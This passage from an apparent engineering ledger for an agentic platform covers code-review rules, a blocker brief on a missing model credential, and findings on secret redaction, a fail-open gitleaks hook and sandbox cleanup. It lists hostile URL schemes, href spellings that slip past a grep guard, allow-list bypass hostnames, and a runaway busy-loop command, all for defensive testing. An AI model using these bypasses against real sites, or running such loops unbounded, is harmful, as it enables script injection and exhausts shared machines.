   child; restoring `process.exit(0)` fails it 3/3.
   *A defect that a reviewer cannot reproduce is not thereby absent — it may be guarded by the very mechanism
   that makes it rare.*
48. **A name-then-`=` guard cannot see the spread, `createElement` or `setAttribute` spelling of the same
   write.** WP-20's `no-html.test.ts` — itself created to enforce rule 44 — caught `href={u}`, `href = {u}`,
   a template literal and `location.href = u`, and **missed** `{...{ href: u }}`, `createElement('a', {href})`,
   `el.setAttribute('href', u)` and `Object.assign`. A file containing two of those passed 16/16, while the
   docblock claimed a property form "does not put an attribute on an element". A syntactic guard is a claim
   about *syntax*; the DOM is reached by more spellings than one grep knows.
47. **An accidental defence is measured, not assumed — and this one covered a quarter of what it appeared
   to.** WP-20's five unguarded `href` sites were said to be saved by React 19.3 rewriting the attribute.
   Round 2 measured all four schemes: React blocks `javascript:` and **not** `data:`, `vbscript:` or `file:`.
   So the exposure was four times what round 1 described, and the "defence" was one framework's handling of
   one scheme. When a finding is downgraded because something else happens to catch it, measure what that
   something else actually catches.
46. **An encoder whose comment claims it makes hostile input inert is a claim a test must kill.** Two
   `encodeURIComponent` deletions in WP-11's adapters survived **3000 of 3000** tests — one in Loki's
   `/label/${name}/values`, one in Sentry's path `segment()` — while the LogQL escaper *beside* them died in
   3 tests under its own mutation. Shipped behaviour was correct; the claim was simply unchecked, on the one
   string standing between provider-controlled input and a URL carrying the `Authorization` header. Rule 44's
   shape, applied to encoders: assert the path that goes on the wire.
45. **A fixture named for the property under test guarantees the property is never tested.** WP-20's
   web-e2e fixture field is called `safeUrl`, so no tier ever fed a hostile scheme into the `href` path that
   had no guard. Name fixtures for what they *are*, not for what you hope they satisfy — and feed the
   hostile value somewhere.
43. **A negative test whose payload every candidate implementation would reject proves nothing — an
   allow-list needs a negative case that only *exact* matching refuses.** WP-13's credential allow-list had
   `evil.example.com` as its only negative; mutating the check to `host.endsWith(allowed)` **survived all 134
   runlet tests** and handed back `SECRET-for-evil.gitlab.example.com`. The negatives that discriminate are
   `evil-gitlab.example.com` and `gitlab.example.com.evil.test`. **Third instance of this shape in one
   session** — WP-08's health probe (a different guard was covering), WP-10's `providerCalls` (a counter that
   never moved), and now this. When you write a negative case, ask which *wrong* implementations it would
   also pass.
42. **A boundary asserted from one side is half a test.** WP-11a's refusal documents assert one byte *past*
   the cap **and the same document exactly at it**. Without the second half, a guard that refuses everything
   passes — which is precisely how a fake that "refuses past `FAKE_MAX_LABEL_BYTES`" could have been written
   to refuse always, and why rule 10 (assert which branch ran) and this one keep meeting.
40. **A hostile-document enumeration is only as wide as the values it dares send.** WP-11a's walk pushes a
   hostile document through and fails on any over-long string — but a field whose bound is a **refusal**
   rather than a cap gets fed a *safe* value, because a hostile one would throw. Deleting `identifier()`
   from five Sentry fields left **758/758 green**. Fields bounded by refusal need their own document,
   asserting the refusal.
38. **`key in record` is not `Object.hasOwn(record, key)`.** It walks `Object.prototype`, so tags named
   `toString`, `constructor` or `__proto__` are silently dropped — and when the key was capped first, it
   compares the **raw** name against **capped** ones, so two names colliding after the cap keep the *last*
   while the docblock (and Loki, citing it as precedent) says the first.
36. **A marker-bearing cap is not idempotent.** WP-11's `mapTags` output exceeds `maxBytes` by the length
   of its own truncation marker, so `capText` re-cuts it and the two disagree — `tags.environment` reports
   "976 more bytes" while `environment` reports "58". Applying a cap twice measures the already-truncated
   text. Make it idempotent, or make it impossible to apply twice.
35. **Making a dependency required proves it is *supplied*, not that it is *used*.** WP-11 made
   `ProviderCreateInput.redactor` required (rule 31). Merging Slack, which landed in parallel, produced
   exactly **four** typecheck errors — all of them *test* call sites constructing the input. Slack's
   production `create()` compiled clean, because a required field is checked where the object is built, not
   where it is read. Adding the field to four literals would have turned `verify` green and left Slack
   redacting nothing: the defect rule 31 names, reintroduced by the act of fixing it. The type gets you the
   argument; only a test that plants a secret and looks for it in the output gets you the behaviour.
34. **Adding a step to `verify` is not adding it to CI.** The two lists are maintained separately and have
   drifted: `ignored:check` — a guard that has already caught two live defects — has run in **no CI job**
   since it was written. Rule 7's shape at the level of the pipeline: derive one list from the other, or
   fail when they differ.
32. **"I checked and it is benign" is a claim that needs the same evidence as a fix.** WP-11 reported a
   surviving `BigInt` → `Number` mutation as harmless and narrowed its docblock instead of the code; the
   orchestrator relayed that as good practice. The reviewer measured it: `Number` diverges for **192 of every
   1e6** nanosecond values (`1780309799999999872` → `…59.999Z`, not `…00.000Z`), and that value **is** the
   emitted `timestamp` and the sort key. Narrowing a claim is honest only when the claim is what was wrong.
30. **A lesson recorded only in prose does not prevent recurrence — when a defect is mechanically
   detectable, add the check.** The ledger's WP-05 entry on a literal NUL byte turning a source file binary
   ends *"worth a lint rule if it ever recurs."* It recurred, in WP-10's `threads.ts`, five work packages
   later: `Bin 0 -> 3808`, invisible in `git diff`, in `git log -p` and in review. Writing it down was not
   enough; the check now runs in `verify`.
28. **A fold that may widen equality must never widen structure.** WP-12's fold is allowed to make more
   paths match a protected pattern — that direction is safe. It is *not* allowed to invent a path
   separator: NFKC maps U+FF0F, and also `℀` U+2100, `℁` U+2101, `℅` U+2105 and `℆` U+2106, into strings
   containing `/`, which would split a filename into two segments and make `src/*.ts` answer **allow** for
   `src/a／b.ts`. Pin every separator the fold can create, and fold per segment rather than over the whole
   string.
16. **A guard against an untrusted producer must not read a field that producer can omit.** A missing number
   is not zero, and `NaN` compares false against every ceiling. Deleting `total_cost_usd` from WP-12's
   `result` line left the budget watchdog silent at `NaN > 0.01`, the run `completed`, and `NaN` flowing to
   the cost ledger. "The vendor enforces it" is a claim about a binary the platform ships and does not
   control.
17. **A provenance label is a claim about the corpus, and an unasserted claim drifts.** WP-08's fixtures
   carry a `source` block naming a vendor documentation URL and a retrieval date; the reviewer rewrote one
   to `kind: documented` with `url: https://example.invalid` and **157 of 157 tests passed**. Fixture
   provenance needs a test, or it is decoration — and the test must be honest about what it cannot check
   (that the vendor's page still says the same thing).
18. **An empty credential is not a credential.** WP-08's webhook verifier accepted
   `HMAC-SHA256('', body)` — a signature any attacker can compute — because an unset secret produced an
   empty string rather than a refusal. Every configuration value whose empty or absent case silently
   produces a *permissive* result is this defect.
19. **A minted credential must carry its own revocation address.** WP-09 minted against
   `request.project` and revoked against `config.project`; the mismatched DELETE 404s, the idempotency that
   "absorbs the 404 of a second revocation" swallows it, and the caller is told the token is revoked while
   it lives until midnight UTC. *Idempotent error-absorption is indistinguishable from the wrong address* —
   whenever a guard absorbs a not-found, ask which not-found it is absorbing.
20. **Fail closed on a mutation; fail open on an inbound notification.** WP-09's `mapPipelineStatus` threw
   on an unknown status inside `normalise`, so a status GitLab adds later turns every such delivery into a
   permanently failing job. Refusing an enum value you do not recognise is right when you are about to
   *act*; when you are being *told* something, it turns a vendor's new feature into a stuck queue.
21. **A mutation harness must be canaried before it is believed, and `--reporter=basic` has now lied in
   both directions.** In vitest 5 that flag does not exist: WP-12's harness read it as *"no test failed"*
   and called every mutant **alive**; WP-09's produced a runner error with **exit code 1**, so a harness
   trusting exit codes would have called every mutant **dead**. Plant a deliberate failure first and watch
   the harness report it — a mutation result is a measurement, and an uncalibrated instrument reads
   whatever you were hoping for.
22. **A layered guard whose outer layer is complete is unreachable, and therefore untested by
   construction.** WP-08's unrequested-marker refusal passes 82 unit and 175 contract tests because nothing
   can drive it — the guard in front of it never lets the state occur. Give the inner layer a seam, or say
   at the line that it is deliberately unreachable defence-in-depth and name the outer guard that makes it
   so; an untestable branch that looks tested is standing rule 3 with better manners.
23. **A new port obligation must land in the shared contract suite in the same change, or it is a
   provider-local promise.** WP-09 taught the git fake and its own contract file that a foreign credential
   handle must yield `not_found` — and left `git-provider-contract-suite.ts` untouched, so a future GitHub
   adapter that silently `return`s for a foreign handle passes the entire shared suite. BD-017's whole claim
   is that a new provider is trustworthy without touching the pipeline; only the suite can make that true.
25. **A load generator needs a cleanup that survives its own parent — and never silence the cleanup.**
   The orchestrator reproduced the WP-06a flake with `for i in $(seq 1 24); do (while :; do :; done) & done`
   and cleaned up with `kill $LOADPIDS 2>/dev/null`. In zsh an unquoted variable does **not** word-split, so
   `kill` received one newline-joined argument and failed — and `2>/dev/null` hid it. Run twice, that leaked
   **48 orphaned spinners** which were reparented to launchd and ran for 4 h 37 m at a combined ~1300 % CPU,
   load average 137, starving the machine (a *different* Claude session on the same host diagnosed and killed
   them). The recipe that works: `trap 'kill 0' EXIT INT TERM` at the top so the whole process group dies with
   the script, a bounded generator (`timeout 60 …`) rather than `while :`, and **no `2>/dev/null` on a cleanup
   step** — the one command whose failure you must not miss.
   *Nothing was invalidated:* every verification after the leak ran at load ~137 and passed, and passing under
   heavy load is a stronger result than passing idle; the reviewers' timing bounds inflate under load, so a
   satisfied bound stays conservative. But two readings were wrong — `verify` durations climbing from 2.7 s to
   16 s were attributed entirely to the growing suite when part of it was the leak, and the `ci-fix` commit
   `f1cd8e4` says "0 out of 8 under the same load" when the post-fix pass in fact ran under **48** spinners
   against the pre-fix pass's 24. Heavier, not equal; the conclusion holds, the sentence does not.
24. **A check that counts execution is not a check that counts assertion.** WP-09's unexercised-fixture
   check survives an unreferenced interaction and a `.skip`ped test — but deleting all three `expect`s from
   a test while keeping its calls passes 32/32. Mutate the assertions, not only the fixtures.

## Blocker briefs needing a human

### 1. WP-17's evals cannot run: there is no model credential in this repository or on this machine

**What is blocked.** WP-17's acceptance criterion *"promptfoo evals green on fixtures within budget"*, and
WP-33 (*nightly real-LLM smoke + evals in CI*) entirely. **Nothing else** — WP-17 merged at `1497fe9` with
its offline half complete, and the eval **cases** are checked in.

**Checked at session start rather than discovered at implementation time** (orchestrator, 2026-09-11):
`gh secret list` is **empty**; the repository has **no environments at all**, so no `llm-ci`, which
`13-implementation-plan.md` names for WP-33; `gh secret list --org gtfo-ai` answers **HTTP 403** (*"must be an
org admin or have the actions secrets fine-grained permission"*); `ANTHROPIC_API_KEY` and
`CLAUDE_CODE_OAUTH_TOKEN` are unset in the orchestrator's shell; promptfoo is not a dependency. An
`OPENAI_API_KEY` **is** set in the user's shell — it is the wrong vendor **and** the user's own credential for
unrelated work, so it is not a substitute and was not touched.

**Exactly what a human must provide**, in order:
1. `pnpm add -Dw promptfoo`.
2. A credential. **Locally**: `ANTHROPIC_API_KEY` (or `CLAUDE_CODE_OAUTH_TOKEN`) in the environment.
   **In CI**: a repository **environment named `llm-ci`** carrying an `ANTHROPIC_API_KEY` secret — the name
   is already what WP-33's plan row expects.
3. Then `pnpm eval` (or `pnpm eval --roles=reviewer`) runs the **36 checked-in cases**.

**What was deliberately not done, and why it matters.** `pnpm eval` **exits 1** naming both missing pieces
rather than exiting 0 having run nothing, and `scripts/eval.test.ts` holds it there — including the case where
the key is set but **empty**, which standing rule 18 exists for and which backlog entry **8** shows live in
this repository today (a gitleaks scan of zero bytes printing `no leaks found`). A work package that stubs its
own acceptance test is worse than one that names its blocker. `--check` prints `PASS: eval --check`, spelled
**differently** from `PASS: eval`, and the test asserts the difference.

**Residual.** `EVAL_MAX_USD` is unwired — nothing can spend until the credential exists, so the budget has
nothing to bound yet. Whoever supplies the credential wires it in the same change.

## Open findings backlog — every loose end, with its source

> Maintained by the orchestrator. A finding leaves this list when it is **merged**, not when it is agreed.
> Each line names where it came from, so a future session can judge the evidence rather than re-derive it.
> **Nothing here blocks M2**; the ordering is by consequence, not by discovery.
> **Numbers are identifiers, not ranks.** Entries are cited by number from `docs/TODO.md` and from
> each other, so a new finding takes the next free number and is *placed* where its consequence puts
> it. A later number above an earlier one is the ordering working, not a mistake.

### 8. **`gitleaks` pre-commit is a no-op in a linked worktree, and it fails open** (TODO)
**What is wrong.** The pre-commit secret scan reports success by scanning nothing when the repository
it is run in is a linked worktree.

**Evidence** (orchestrator, 2026-09-11, worktree `.claude/worktrees/docs`). The hook's container
fallback printed `fatal: not a git repository: /Users/janmikes/www/agentic-platform/.git/worktrees/docs`,
then `0 commits scanned`, then `scanned ~0 bytes (0)`, then **`no leaks found`** and a green
`✔️ gitleaks`. The mechanism is not in doubt: a linked worktree's `.git` is a *file* holding
`gitdir: …/.git/worktrees/<name>`, and the container follows neither the file nor the path it names.

**What it costs to leave.** BD-002 — "no secrets in the repo, ever" — is one of this project's
non-negotiables, and this is standing rule 18's shape (*an empty credential is not a credential*)
inside the gate that exists to enforce it: a scan of zero bytes is not a scan, and it is spelled the
same as a real pass. The exposure is bounded and worth stating precisely: CI's `secret scan` job runs
on an ordinary full checkout and is unaffected, so the repository is covered at the gate that has the
last word. What is lost is the *local* half — and `14-orchestration-protocol.md` tells every future
session to work in worktrees, so the decoration is exactly what an agent's commits meet.

**What done looks like.** The hook either scans the worktree correctly (mount the parent `.git` and
the `worktrees/<name>` gitdir into the container, or take the host binary when one is present) **or
refuses loudly**. It must not print `no leaks found` over zero bytes: a `0 commits scanned` /
`~0 bytes` result is a failure. The refusal needs its own assertion, because the whole finding is
that the failing path and the passing path were spelled identically — a check that cannot fail is
rule 18 twice over.

**Needs measurement** (not run here, rule 66): whether this session's *agent* worktrees —
`.claude/worktrees/slack-fix` and the `wp/*` worktrees — were affected at all. They carry
`node_modules`, so they may have taken the binary path rather than the container fallback, and nobody
has checked which. Until somebody does, the honest statement is that every commit made from a
worktree this session is **unverified** by the pre-commit half, not that it was unscanned.

**Depends on.** Nothing. One file (`scripts/gitleaks.mjs`), owned by no work package — whoever next
touches the hook, and before the next session that runs agents in worktrees.

### 0. **CI was red from WP-14 to session 3** — `e2e-fake-claude` on Linux (ci-fix, RESOLVED)
Six consecutive red runs on `main`, `34509491314` (WP-14's merge) through `34572185799`, every other job
green. **Three** independent clean-environment defects stacked behind one another; see rule 71 and the
ci-fix notes. First green run: **`34580312845`**, all eleven jobs. Left behind by it:

- **`composeSecretRedactors` cannot detect a duplicate placeholder name** — `SecretRedactor` is two methods
  with no inventory, and compose is what all five adapters build. `exactSecretRedactor` now refuses a
  duplicate at construction; the compose gap is **asserted by a named test** rather than closed. Closing it
  needs an inventory on the port.
- ~~**A one-way digest for inbound delivery keys**~~ — **CLOSED by architect ruling at WP-15c** (recorded in
  full under "Architect ruling (WP-15c)" below). The answer is **(a)**: `inbox.delivery_id` stays the
  adapter's redacted plaintext key, and the digest is closed rather than deferred. Two of the four objections
  this bullet recorded were **wrong**, and the ruling says so: `APP_SECRET_KEY` is **unplumbed, not
  unavailable** (`apps/server/src/config.ts:353` reads it; `apps/server/src/pipeline.ts:269` already calls
  `deriveSecretKey(options.secretKey)`), so a keyed digest was a parameter away; and the collapse residual is
  **unreachable on both shipped providers** by charset and vendor-generation rather than by "no instance on
  disk" — every GitLab key part is vendor-generated except the push `ref`, and `git-check-ref-format` forbids
  `[` and `:`, both of which the placeholder contains, while Jira's whole key is one vendor identifier header.
  What decided it is not either of those: **(a)'s safety property is a post-condition of the redactor and
  holds on every binding unconditionally**, while **(b)'s weakness is conditional on deployment configuration
  an operator cannot see** — so (a) does not have the defect it was being preferred for avoiding. The ruling
  also keeps `delivery-key-redaction.test.ts` **unchanged** and explains why that is the load-bearing half:
  `expect(key).toContain(MARKER)` fails both when an adapter forgets to redact and when a new provider keys a
  field its recipe does not plant into, whereas the two `not.toContain` halves are satisfied by *any* digest,
  including one over the empty string. Original bullet, for the record:
- **A one-way digest for inbound delivery keys** (rule 70's third option). Measured available and deliberately
  not taken: unkeyed it does not store "no secret" at `MIN_SECRET_LENGTH` 8; the only key an inbound adapter
  holds is the binding's webhook secret, `string | null` on GitLab, so the property would hold on some
  bindings and silently weaken on others (rule 18); `APP_SECRET_KEY` is not plumbed to a registration; and a
  digest makes `delivery-key-redaction.test.ts` vacuous. Nothing writes `inbox` yet, so there is time —
  and the work package that first will is now named: **WP-15c**, which owns the ingress and the inbox row,
  and which therefore has to answer this before it writes its first `delivery_id`.
- **Two stored-secret siblings, found by the rule-49 sweep and filed rather than fixed** (WP-12/WP-15 scope,
  verified at the sinks by two reviewers): a run's `structuredOutput` reaches `artifacts.data`,
  `questions.text` and `tasks` unredacted while the same message's transcript copy is redacted
  (`stage-executor.ts:385,388,447`); and `handler_executions.error` / `event_dispatch.error`
  (`event-bus.ts:486` → `recordFailure:309`).

### 35. **A run's `structuredOutput` is stored in `artifacts.data` unredacted, and TD-012's write list names artifacts** (TODO — **measured at WP-18b**, session 5; filed as a bullet twice since WP-12/WP-15 and never given a number; **no work package owns it**)
**What is wrong.** TD-012 is redaction *at the write*, and the writes are enumerated rather than implied:
`docs/decisions/technical/TD-012-secret-redaction-at-write.md:8` names `run_messages`,
`integration_actions`, `events.payload`, `config_audit`, **artifacts** and KB commits, and requires
`redaction_count` and `redaction_log` on the row. Exactly one of those paths redacts model output today —
the transcript sink. The runner hands the structured output on untouched and the stage executor stores it
verbatim, so a secret the platform itself injected into the run's environment is persisted in
`artifacts.data` and in everything copied out of it.

**Evidence, and it is a measurement rather than a reading** (WP-18b's implementer, session 5, rule 86),
quoted from the report rather than paraphrased: *“`createClaudeRunner` returns
`structuredOutput: validated.data` untouched (`claude-runner.ts:645`), so the planted `ANTHROPIC_API_KEY`
the scenario writes into a proposal is present verbatim in the `artifacts` row —
`expect(JSON.stringify(artifact)).toContain(PLANTED_MODEL_KEY)` passes. TD-012's write list names
*artifacts*.”* The runner line is
`packages/infrastructure/src/runner/claude-runner.ts:645`. The reproduction runs the **production**
runner over a scripted CLI inside a real `apps/server`, not the fake (rule 82), and the assertion is
`test/e2e/pipeline/librarian.e2e.test.ts:200`.
The case is
`test/e2e/pipeline/librarian.e2e.test.ts` › "records what it proposed, commits what the policy accepted, and redacts both"

**The same class was filed twice before, with no number and no owner** — which is why it is being numbered
now rather than described again. The slack-branch sweep's table (session 4, under “Same branch, review round
2”) reads: *“**`artifacts.data`, `questions.text`, the MR fields on `tasks`** ← a run's `structuredOutput` |
**the fifth instance, one ring over — filed below, not fixed here**”*, and backlog entry **0**'s last bullet
carries the same sentence. Both were verified by reading the sink, not inferred from a name.

**The sinks, read on this tree** (refiner, session 5 — grep and file reads, no test run, rule 66).
- The write: `data = outcome.structuredOutput` at
  `packages/application/src/pipeline/stage-executor.ts:617`, stored by `store.artifacts.insert` at
  `packages/application/src/pipeline/stage-executor.ts:620` (the `data` field at `:625`). `artifacts` has no
  `redaction_count` column to record a redaction that did happen —
  `packages/infrastructure/src/db/migrations/0004_pipeline.sql:138-150`.
- **`questions.text`, which is the live reach**: `artifactQuestions(data)` →
  `store.questions.insert` at `packages/application/src/pipeline/stage-executor.ts:679`, and the text is
  **served over HTTP and rendered**: `GET /api/tasks/:task_id` projects every question through
  `apps/server/src/queries/pipeline-queries.ts:457`.
- **The MR fields on `tasks`**: `recordMergeRequest` reads the `ImplementationNotes` artifact back and copies
  `branch`, `mr.url` and `mr.head_sha` onto the task —
  `packages/application/src/pipeline/saga.ts:626-673` (`branch` at `:657`, `head_sha` at `:669`).
- **The proposal row does *not* inherit the hole, and that is measured in both directions.** WP-18b redacts
  the whole of a proposal's text **before** the `kb_proposals` row and therefore before the commit
  (`packages/application/src/knowledge/librarian.ts:124,207`, with the redactor composed at
  `apps/server/src/knowledge.ts:303`), and the same e2e asserts the planted key is absent from
  `kb_proposals.delta` and from the commit with the placeholder present in both (rule 42).
  So the git-commit reach is closed on the librarian's path; what is open is the artifact row and the two
  copies above. `events.payload` is clean here for a different reason: `artifact.created` carries
  `artifactRefSchema` (id, type, version, url) and not the data —
  `packages/contracts/src/events.ts:327-331`.

**What it costs to leave.** A credential the platform injected into a run — the model key today, a git token
tomorrow — is stored in plain text in `artifacts`, is copied into `tasks`, and reaches a **user-visible API
response** through `questions.text`. `artifacts` and `events` are append-only, so a row written today cannot
be fixed later (TD-012 says so in the same sentence), and the platform has no `redaction_count` on the
artifact that would let an operator see which rows are affected. The screen is safe from *markup* (BD-022,
`apps/web/src/ui/untrusted.tsx`) and that is a different property: a secret rendered as text is still a
secret on a screen.

**What would make it urgent.** It is **live wherever a runner is composed, latent elsewhere.** `startRuntime`
composes `unavailableClaudeRunner` when no `RunWorkspaceProvisioner` is configured, so a default instance
stores no artifact from a real model at all; the day an operator configures the provisioner and a model
credential (WP-15g), every artifact row is a write of unredacted model output. The e2e above is the existing
proof that the path is real rather than theoretical.

**What “done” looks like — and the design question is the part that is not decided.** The old filing already
names it, and it is the reason this is not a one-line fix: **an artifact field the pipeline branches on
cannot be placeholder-redacted without breaking the branch.** `mr.head_sha` and `mr.url` above are read back
out of the artifact and used to address a merge request; a `[REDACTED:integration:…]` in either is a value
the platform then queries a provider with. Two candidate answers, and the change should pick one and say
which:
- **(a) Redact the stored copy, keep the in-memory value for the same transaction.** The executor already
  holds `data` in a variable; it would store `redact(data)` and continue to branch on the unredacted value
  for the rest of that transaction. Cheapest, and it makes `artifacts.data` an audit copy rather than the
  source of truth — which is a statement `saga.ts`'s later read-back contradicts, because
  `recordMergeRequest` reads the **row**, not the variable.
- **(b) A per-field policy on the artifact schema.** Each artifact type declares which fields are
  identifiers the platform branches on and which are prose; prose is redacted, identifiers are refused if
  they *contain* a secret rather than rewritten (the answer `idempotencyScopeFor` already gives for a key —
  redaction is many-to-one and an identity must not be many-to-one).
Either way: use the **run's own** TD-012 redactor, the one `apps/server/src/agent.ts` already builds from
`RunSpec.secretEnvNames` for the transcript sink, so the two cannot name different secrets; add a
`redaction_count` column in a new numbered migration and assert it in **both** directions (a writer that
redacted nothing and a run with nothing to redact look identical from one side — WP-15b's precedent); and
amend TD-012 if the answer narrows its list rather than satisfying it. The e2e assertion above then becomes
the placeholder and the two beside it do not move, which the implementer states at the line.

**Needs measurement: none to start.** The reproduction exists, is deterministic, and is already checked in.
What a future implementer must *not* do is re-derive it from the fake runner — `FakeClaudeRunner` is
composed with a sink that stores nothing, so the bytes this finding is about would not exist (rule 82).

**Depends on / owner.** **None today, and that is the finding** — it is one ring above every work package
that found it: WP-12 built the runner, WP-15 the executor, WP-18b the sink that is *correctly* redacted.
Cheapest home: **whoever next touches the artifact write in
`packages/application/src/pipeline/stage-executor.ts`**. Related and worth doing in one change: **Q64**
recommends storing `runs.system_prompt`/`user_prompt` redacted at the write and amending TD-012's list in the
same commit — the same redactor, the same decision, one migration. Entry **18** (`tasks.save` whole-row
writes) touches the same `saga.ts` read-back and should not be conflated with it.

### 0b. **No sweep reclaims an orphaned control *directory*** — what is left of "a per-run control volume" after WP-22 (TODO; the capability half is **CLOSED**, the volume half is **REFUSED**, the sweep is open)
**Read the status before the history.** This entry was written as *"a per-run control volume — the fix the
ci-fix routed around"*, and WP-22, which it named as owner, answered it in three parts (refiner, session 5;
the full measurement is under "WP-22 — images and compose"). Kept in one place rather than split, because
the evidence below is what a reader needs to judge all three.

**1. The capability half is CLOSED, at WP-14, before this entry's owner ever picked it up.** The entry calls
`CAP_DAC_OVERRIDE` *"the evidence the shape is wrong"*; WP-14's two-helper teardown
(`#removeControlDirectory`) removed it. Verified read-only here: `grep -rn DAC_OVERRIDE` over the tree finds
**three comments and no capability** — `packages/infrastructure/src/workspace/provider.ts:421,979,981` — plus
the e2e cases that assert its absence. Every capability set the provider builds is `[]` or `['CHOWN']`
(`packages/infrastructure/src/workspace/hardening.ts:281,332`). So the evidence this entry rested on is gone.

**2. The volume half is REFUSED by WP-22, with two decisions named.** A **per-run** control volume
contradicts TD-025 § 2, which gives the runner a *static* mount of the whole `ctl` volume precisely so that
nothing has to mount a volume per run; and it contradicts TD-021's WP-15g amendment, which forbids the
process that composes the pipeline from holding a Docker client — a per-run volume needs either a dynamic
mount from the runner (a Docker client in the server) or the out-of-process transport that does not exist
(Q52). A future session that wants the per-run volume back has to move one of those two decisions first,
and should say which.

**3. What is actually live is one level down: the shared `ctl` volume is labelled `role=shared` and is
visible; a *directory* inside it is not.** `purgeExpired` lists **volumes** by `role=workspace` and never
looks inside `ctl`, so a run whose `destroy` left step 1 or step 2 of `#removeControlDirectory` unfinished
leaves either a live run token or an empty `0700` directory behind for ever. The provider's own docblock
states it; what is missing is the sweep. **What it costs to leave**: an unbounded set of directories in a
volume nothing enumerates, and — in the step-1 case — a run token outliving its run, which is the half that
matters for BD-002 rather than for disk. **What done looks like**: `purgeExpired` lists the `ctl` volume's
directories beside the volumes it already lists, removes one whose run is gone using the same two-helper
removal, and reports it — asserted in both directions, because a sweep that found nothing and a sweep that
looked at nothing are spelled the same (rule 18). **Depends on**: nothing. **Owner**: no work package —
whoever next touches `purgeExpired`; WP-22 filed it as discovered work rather than doing it, because it is a
change to the launcher's sweep and not to the image layout that row owns.

**Original entry, for the record.** An agent can lock its own control directory only because `#prepare` chowns it to uid 1000 on a **shared**
volume, which is why teardown needs `CAP_DAC_OVERRIDE` to reclaim it at all. A **per-run** control volume
needs no capability, and it is visible to the label sweep rather than invisible to it (rule 60). Both the
reviewer and the implementer reached this independently; it was held out of the ci-fix deliberately because
a ci-fix that grows into a design change stops being reviewable. Measured bound on today's shape: only
`/ctl` is mounted, so `DAC_OVERRIDE` reaches every live run's token there — rootfs read-only, no network,
fixed script, uuid-validated id, ~1 s, and the agent cannot influence it. **No cross-run escalation exists
today**: `chmod -R` over a symlink to a sibling run left it at `500`, its token `400`, contents intact, and
`rm -rf` unlinked the link rather than the target.
Checked rather than rewritten, and the two parts it was missing: **what done looks like** is the volume per
run plus the teardown dropping `CAP_DAC_OVERRIDE` — the capability is the *evidence* the shape is wrong, so
a fix that keeps it has not landed — and the **owner** is **WP-22**, which builds the compose file and the
images and is the first place the volume layout is written down rather than constructed in a test.

### 28. **CI's e2e job was red on the commit this session merged, and every test in it had passed** (**RESOLVED** at `9b1187a`, session 5, CI `34688812021` green — kept for its evidence; the measured mechanism is under "WP notes — session 5" and in standing rule **85**)

> **RESOLVED, session 5.** The hypothesis below was right about the mechanism and wrong about the shape of
> the leak: after `runtime.stop()` **no** backend remains (measured against `pg_stat_activity`), so nothing
> was forgotten — `pg-pool`'s `end()` resolves once its client array is empty, and `_remove` calls
> `client.end()` **without awaiting it** (`pg-pool@3.14.0`, re-derived by the reviewer), so
> `database.close()` returns with a socket still attached and `drop … with (force)` on the next line
> terminates it; the FATAL reaches `pool.emit('error')`, and **no pool in the repository had a listener**.
> Closed in two places with different rules: the production pool reports and keeps serving (a failover
> against an idle pooled connection would have taken `apps/server` down — a production defect the flake
> exposed), the harness absorbs **exactly** `57P01` and re-throws everything else, the ten integration pools
> built through `createDatabasePool` carry a strict logger with the same asymmetry, and a census in
> `packages/infrastructure/src/db/pool-errors.test.ts` refuses a third construction site over tracked
> **and** untracked files. Asserted from both sides on a real database; mutants re-derived by the reviewer
> on copies. Local runs never reproduced the race; the first green Linux run after the fix is
> `34688812021`, which is the first honest measurement (rule 71), not proof the class is gone.

**What is wrong.** The e2e tier can fail its job on an **unhandled** PostgreSQL error raised after every
test has reported green, and vitest says in the same breath that such a run may contain false positives.
So `main` carries a red CI run at the commit the ledger records as green on six targets, and the tier's
verdict is worth slightly less than it reads until this is closed.

**Evidence** (refiner, session 4 — `gh run view` only, no test run, rule 66). Run **`34671397340`**, head
**`5b01f73`** (WP-15g's merge): ten jobs green, **`e2e-fake-claude` failed**. In the job's own words,
`test/e2e/workspace/docker-workspace.e2e.test.ts (40 tests)` ✓ and every named case ✓, then:

> `Vitest caught 1 unhandled error during the test run.` · `This might cause false positive tests. Resolve
> unhandled errors to make sure your tests are not affected.` · `Uncaught Exception` · `error: terminating
> connection due to administrator command` · `parseErrorMessage node_modules/.pnpm/pg-protocol@1.16.0/node_modules/pg-protocol/dist/parser.js:306:11`

with `Serialized Error: { … severity: 'FATAL', code: '57P01', … database: 'default-composition_67463fbbdf674afb9421512635acd678', port: 32769 … }`,
`This error originated in "test/e2e/pipeline/composition.e2e.test.ts"`, and then `FAIL: verify:e2e`. The
**next** run, `34671529213` (`d6ebe2d`, docs only), passed the same job on the same code — so it is a race,
not a breakage.

**Hypothesis, labelled one** (rule 39). `test/integration/support/postgres.ts:78` drops each per-test
database with `drop database if exists "<name>" with (force)`, which terminates every backend still
attached; a client of the `default-composition` instance (started at
`test/e2e/pipeline/composition.e2e.test.ts:76`, stopped in `afterAll` at `:52-55`) is still connected at
that moment and carries no `error` listener, so `57P01` arrives as an uncaught exception. **Needs
measurement** (not run here): which pool outlives `stop()` — the instance's own runtime pool, or a
connection `stop()` returned before draining — and whether the losing order is `afterAll` against the
global teardown.

**What it costs to leave.** Two things, and the second is worse than a flake. (1) A push onto `main` whose
gate is red while the session's own shell says green — rule 75's shape at the gate that has the last word,
and the resume note's "green on all six targets" is true of the orchestrator's shell and false of CI for
`5b01f73`. (2) Vitest's warning is literal: an unhandled error in a run **can** mask a failed assertion, so
every `PASS: verify:e2e` taken while this is live certifies less than it appears to — including the ones
WP-22's images will be verified by, since that tier is where they land.

**What "done" looks like.** A `57P01` during teardown cannot reach the process as an uncaught exception:
either the pool that owns the connection is drained before its database is dropped, or the teardown path
attaches an `error` listener that swallows **exactly** `57P01` and says at the line why that is not
swallowing a real failure. Asserted by a case that drops a database `with (force)` while a pool of the
harness's own making holds an idle client, and that fails today. Re-running the job is not a close.

**Depends on.** Nothing. **Owner: none** — no work package owns the e2e harness. Cheapest for whoever next
touches `test/integration/support/postgres.ts`, and **before WP-22** leans on this tier for its images.

### 1. What WP-15a left behind — **production still does not start the pipeline** (TODO)
The sentence a reader needs, in the reviewer's words: **"The pipeline is composed and production does not
start it."** Three separate things, none of them WP-15a's to fix:

All three are now scheduled — the two that had no home are **WP-15b** and **WP-15c** in
`13-implementation-plan.md`, each with an acceptance criterion; the third already had one on WP-19.

- **A Postgres `IntegrationAuditLog` and its migration** — now **WP-15b**. `integration_actions` lacks
  `project_id`, `redaction_count` and `attempts`. Until it exists, `main.ts:18` and `scripts/dev.mjs:70`
  call `startRuntime()` with no runner and no audit log, and `/readyz` is **503 for ever** on
